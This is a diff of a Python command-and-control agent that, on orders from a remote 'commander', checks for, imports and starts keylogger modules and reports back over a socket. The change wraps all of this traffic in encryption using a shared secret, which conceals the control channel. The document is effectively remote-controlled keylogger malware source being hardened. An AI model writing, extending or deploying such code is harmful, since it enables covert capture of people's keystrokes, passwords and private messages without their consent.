@@ -30,20 +30,21 @@ if __name__ == '__main__':
 
         try:
             while True:
-                # Receive data from the client
+                # Receive encrypted data from the client
                 data = client_socket.recv(1024)
+                decrypted_data = decrypt_string(data.decode(), shared_secret)
                 if not data:
                     print(constants.CLIENT_DISCONNECT_MSG.format(client_address[0], client_address[1]))
                     break
 
 # a) Command to start/stop keylogger program
-                if data.decode() == constants.START_KEYLOG_MSG:
+                if decrypted_data == constants.START_KEYLOG_MSG:
                     print(constants.START_KEYLOGGER_PROMPT)
-                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
+                    client_socket.send(encrypt_string(constants.RECEIVED_CONFIRMATION_MSG, shared_secret).encode())
 
                     # Receive command and filename from commander
-                    command = client_socket.recv(1024).decode()
-                    file_name = client_socket.recv(1024).decode()
+                    command = decrypt_string(client_socket.recv(1024).decode(), shared_secret)
+                    file_name = decrypt_string(client_socket.recv(1024).decode(), shared_secret)
                     print(constants.RECEIVE_FILE_NAME_PROMPT.format(file_name))
 
                     if command == constants.CHECK_KEYLOG:
@@ -58,16 +59,18 @@ if __name__ == '__main__':
                         # Check if the file exists
                         if os.path.exists(file_path):
                             print(constants.FILE_FOUND_MSG.format(file_name))
-                            client_socket.send(constants.STATUS_TRUE.encode())
-                            client_socket.send(constants.FILE_FOUND_MSG_TO_COMMANDER.format(file_name).encode())
+                            client_socket.send(encrypt_string(constants.STATUS_TRUE, shared_secret).encode())
+                            client_socket.send(encrypt_string(constants.FILE_FOUND_MSG_TO_COMMANDER.format(file_name),
+                                                              shared_secret).encode())
 
                             # Await signal to start
-                            signal_start = client_socket.recv(1024).decode()
+                            signal_start = decrypt_string(client_socket.recv(1024).decode(), shared_secret)
 
                             # Start Keylogger
                             if signal_start == constants.START_KEYLOG_MSG:
                                 print(constants.EXECUTE_KEYLOG_MSG.format(file_name))
-                                client_socket.send(constants.EXECUTE_KEYLOG_MSG_TO_CMDR.format(file_name).encode())
+                                client_socket.send(encrypt_string(constants.EXECUTE_KEYLOG_MSG_TO_CMDR.format(file_name),
+                                                                  shared_secret).encode())
                                 module_name = file_name[:(len(file_name)) - 3]
 
                                 # Set global signal and start a thread to watch (prevents recv() blocking)
@@ -89,16 +92,17 @@ if __name__ == '__main__':
                                     print(constants.KEYLOG_SUCCESS_MSG.format(file_name))
                                     parsed_msg = (constants.STATUS_TRUE + "/" + constants.KEYLOG_SUCCESS_MSG_TO_CMDR.
                                                   format(file_name))
-                                    client_socket.send(parsed_msg.encode())
+                                    client_socket.send(encrypt_string(parsed_msg, shared_secret).encode())
                                 else:
-                                    client_socket.send(constants.STATUS_FALSE.encode())
+                                    client_socket.send(encrypt_string(constants.STATUS_FALSE, shared_secret).encode())
                                     parsed_msg = (constants.STATUS_FALSE + "/" + constants.FAILED_IMPORT_MSG
                                                   .format(module_name))
-                                    client_socket.send(parsed_msg.encode())
+                                    client_socket.send(encrypt_string(parsed_msg, shared_secret).encode())
                         else:
                             print(constants.FILE_NOT_FOUND_ERROR.format(file_name))
-                            status = client_socket.send(constants.STATUS_FALSE.encode())
-                            msg = client_socket.send(constants.FILE_NOT_FOUND_TO_CMDR_ERROR.format(file_name).encode())
+                            status = client_socket.send(encrypt_string(constants.STATUS_FALSE, shared_secret).encode())
+                            msg = client_socket.send(encrypt_string(constants.FILE_NOT_FOUND_TO_CMDR_ERROR
+                                                                    .format(file_name), shared_secret).encode())
 
 # b) Command to GET keylog program from commander
                 if data.decode() == constants.GET_KEYLOGGER_MSG:
